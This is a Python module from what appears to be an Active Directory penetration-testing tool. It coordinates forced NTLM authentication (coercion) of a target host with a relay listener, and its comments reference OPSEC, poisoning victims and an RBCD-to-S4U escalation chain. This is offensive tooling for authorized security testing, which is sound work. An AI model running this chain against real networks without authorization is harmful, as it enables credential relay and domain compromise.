"""Composition helpers for native coercion plus native relay."""

from __future__ import annotations

import asyncio
import contextlib
import dataclasses
from dataclasses import dataclass
from typing import Any

from adscan_internal.rich_output import mark_sensitive, print_info_debug
from adscan_internal.services.listener_ip import report_callback_outcome
from adscan_internal.services.coercion.runner import (
    NativeCoercionRunConfig,
    run_native_coercion,
)
from adscan_internal.services.relay.core import RelayRunResult, RelayTarget
from adscan_internal.services.relay.runner import NativeRelayRunConfig, run_native_relay


#: Longest wait for the relay listener to come up before coercing anyway (the
#: claim on the listener broker is near-instant); past this the coercion runs
#: and the relay result decides.
_LISTENER_READY_BUDGET_SECONDS = 30.0


@dataclass(frozen=True)
class NativeCoerceRelayConfig:
    """Configuration for a native coerce-and-relay chain."""

    listener_host: str
    relay: NativeRelayRunConfig
    coercion: NativeCoercionRunConfig
    listener_ready_delay_seconds: float = 1.0
    # Active shell, used only to record/advise on the callback outcome for the
    # advertised ``listener_host`` (see ``listener_ip.report_callback_outcome``).
    # ``None`` (tests, non-shell callers) disables that and changes nothing else.
    shell: Any = None


@dataclass(frozen=True)
class NativeCoerceRelayResult:
    """Aggregate result for one native coerce-and-relay chain."""

    relay_result: RelayRunResult
    coercion_success: bool
    coercion_attempts: int

    @property
    def success(self) -> bool:
        """Return whether the relay target succeeded."""

        return self.relay_result.success


def _report_callback_outcome(
    config: NativeCoerceRelayConfig,
    *,
    target: str,
    relay_result: RelayRunResult,
) -> None:
    """Record an arrival (or advise on its absence) for the advertised address.

    The relay listener counted the authentications, so ``authentications_seen``
    is the arrival signal. Best-effort: this must never break the relay result.
    """

    if config.shell is None:
        return
    try:
        report_callback_outcome(
            config.shell,
            advertised_ip=config.listener_host,
            target=target,
            arrived=relay_result.authentications_seen > 0,
            listener_error=relay_result.listener_error,
        )
    except Exception as exc:  # noqa: BLE001 - evidence must never fail the chain
        print_info_debug(f"callback outcome not recorded: {type(exc).__name__}")


def _relay_config_expecting(
    relay: NativeRelayRunConfig, *hosts: str | None
) -> NativeRelayRunConfig:
    """The relay config waiting for the coerced host (unless the caller named one).

    The coerced target is the caller the relay wants: the listener broker routes
    its connections to the relay and keeps every other caller (a victim of the
    background poisoning) on the capture, so the two share the port.
    """
    if getattr(relay, "expected_sources", ()) or not dataclasses.is_dataclass(relay):
        return relay
    expected = tuple(dict.fromkeys(str(h).strip() for h in hosts if str(h or "").strip()))
    return dataclasses.replace(relay, expected_sources=expected)


async def run_native_coerce_and_relay(
    *,
    targets: list[RelayTarget],
    coercion_connection_factory,
    coercion_target_host: str,
    config: NativeCoerceRelayConfig,
    coercion_target_name: str | None = None,
) -> NativeCoerceRelayResult:
    """Start native relay, trigger native coercion, and await relay completion."""

    print_info_debug(
        "[relay] starting native coerce-and-relay "
        f"coercion_target={mark_sensitive(coercion_target_name or coercion_target_host, 'hostname')} "
        f"listener={mark_sensitive(config.listener_host, 'hostname')} "
        f"relay_source={mark_sensitive(config.relay.source, 'text')}"
    )

    # Shared signal: the relay engine sets it the instant a target succeeds, and
    # the coercion polls it (via capture_signal) so it stops firing immediately —
    # otherwise a one-shot relay leaves the full coercion catalog still walking,
    # piling stray coerced connections onto the (now idle) listener that each
    # block ~20s waiting for a challenge that will never come.
    relay_success_event = asyncio.Event()
    listener_ready = asyncio.Event()
    relay_task = asyncio.create_task(
        run_native_relay(
            targets=targets,
            config=_relay_config_expecting(
                config.relay, coercion_target_host, coercion_target_name
            ),
            success_event=relay_success_event,
            listener_ready=listener_ready,
        )
    )
    coercion_task: asyncio.Task | None = None
    try:
        # Coerce only at a live listener: a listener that never started must
        # not cost a coercion against the target (OPSEC, and a misleading "no
        # callback" afterwards).
        ready_wait = asyncio.create_task(listener_ready.wait())
        try:
            await asyncio.wait(
                {relay_task, ready_wait},
                timeout=_LISTENER_READY_BUDGET_SECONDS,
                return_when=asyncio.FIRST_COMPLETED,
            )
        finally:
            ready_wait.cancel()
            with contextlib.suppress(asyncio.CancelledError):
                await ready_wait
        if relay_task.done() and not listener_ready.is_set():
            relay_result = relay_task.result()
            if relay_result.listener_error:
                _report_callback_outcome(
                    config,
                    target=coercion_target_name or coercion_target_host,
                    relay_result=relay_result,
                )
                return NativeCoerceRelayResult(
                    relay_result=relay_result,
                    coercion_success=False,
                    coercion_attempts=0,
                )
        await asyncio.sleep(max(config.listener_ready_delay_seconds, 0.0))
        existing_signal = getattr(config.coercion, "capture_signal", None)

        def _stop_coercion() -> bool:
            if relay_success_event.is_set():
                return True
            return bool(existing_signal()) if callable(existing_signal) else False

        # Inject the combined stop signal. Only a real dataclass instance can be
        # ``replace``d; tests may pass a stand-in config, in which case the
        # original is used unchanged (its mocked coercion never consults it).
        if dataclasses.is_dataclass(config.coercion) and not isinstance(
            config.coercion, type
        ):
            coercion_cfg = dataclasses.replace(
                config.coercion, capture_signal=_stop_coercion
            )
        else:
            coercion_cfg = config.coercion
        coercion_task = asyncio.create_task(
            run_native_coercion(
                connection_factory=coercion_connection_factory,
                target_host=coercion_target_host,
                target_name=coercion_target_name,
                config=coercion_cfg,
            )
        )

        done, _pending = await asyncio.wait(
            {relay_task, coercion_task},
            return_when=asyncio.FIRST_COMPLETED,
        )
        if relay_task in done:
            print_info_debug("relay-teardown relay_task completed; collecting relay_result")
            relay_result = await relay_task
            print_info_debug(
                "relay-teardown relay_result collected; cancelling/collecting coercion task"
            )
            coercion_result = await _cancel_or_collect_coercion(coercion_task)
            print_info_debug(
                "relay-teardown coercion task settled; returning coerce-and-relay result"
            )
            _report_callback_outcome(
                config,
                target=coercion_target_name or coercion_target_host,
                relay_result=relay_result,
            )
            return NativeCoerceRelayResult(
                relay_result=relay_result,
                coercion_success=coercion_result.success
                or relay_result.authentications_seen > 0,
                coercion_attempts=max(
                    coercion_result.attempts,
                    relay_result.authentications_seen,
                ),
            )

        coercion_result = await coercion_task
        relay_result = await relay_task
        _report_callback_outcome(
            config,
            target=coercion_target_name or coercion_target_host,
            relay_result=relay_result,
        )
        return NativeCoerceRelayResult(
            relay_result=relay_result,
            coercion_success=coercion_result.success,
            coercion_attempts=coercion_result.attempts,
        )
    except Exception:
        if not relay_task.done():
            relay_task.cancel()
            with contextlib.suppress(asyncio.CancelledError):
                await relay_task
        if coercion_task is not None and not coercion_task.done():
            coercion_task.cancel()
            with contextlib.suppress(asyncio.CancelledError):
                await coercion_task
        raise


# After a successful relay we cancel the still-firing coercion. The in-flight
# coercion trigger (e.g. an EfsRpc* call over a named pipe) can be wedged on an
# SMB read that does NOT honour CancelledError promptly: the coerced victim is
# busy trying to reach our listener (which already captured + relayed), so its
# RPC response never arrives and a plain ``await coercion_task`` after cancel
# would hang until that SMB read hits its own (long) socket timeout — freezing
# the whole RBCD chain right before S4U. Bound the wait so we always move on.
_COERCION_CANCEL_BUDGET_SECONDS = 8.0


async def _cancel_or_collect_coercion(coercion_task: asyncio.Task):
    """Return the coercion result, cancelling it if the relay finished first.

    Robust against an uncancellable in-flight coercion RPC: after requesting
    cancellation we wait at most ``_COERCION_CANCEL_BUDGET_SECONDS`` for the task
    to settle. If it does not (its SMB/RPC await is wedged) we ABANDON it — it
    self-reaps when its underlying socket times out — and return a placeholder so
    the caller proceeds. We use ``asyncio.wait`` (NOT ``await``/``wait_for``) so a
    task that ignores cancellation can never wedge the teardown: on timeout it
    simply stays pending and we move on.
    """
    from adscan_internal.services.coercion.core import (
        CoercionRunResult,
        CoercionTarget,
    )

    def _placeholder() -> CoercionRunResult:
        return CoercionRunResult(
            target=CoercionTarget(host="cancelled-after-relay"),
            results=(),
            timed_out=False,
            attempts=0,
        )

    if not coercion_task.done():
        print_info_debug("relay-teardown cancelling in-flight coercion task")
        coercion_task.cancel()
        done, _pending = await asyncio.wait(
            {coercion_task}, timeout=_COERCION_CANCEL_BUDGET_SECONDS
        )
        if coercion_task not in done:
            print_info_debug(
                "relay-teardown coercion task did not settle within "
                f"{_COERCION_CANCEL_BUDGET_SECONDS:.0f}s of cancel; abandoning it "
                "(self-reaps on socket timeout) and proceeding"
            )
            return _placeholder()
        print_info_debug("relay-teardown coercion task settled after cancel")
    else:
        print_info_debug("relay-teardown coercion task already done; collecting result")

    # Task is done (settled normally, errored, or cancelled). Extract the result
    # if it returned one; otherwise fall back to the placeholder.
    with contextlib.suppress(asyncio.CancelledError, Exception):
        return coercion_task.result()
    return _placeholder()
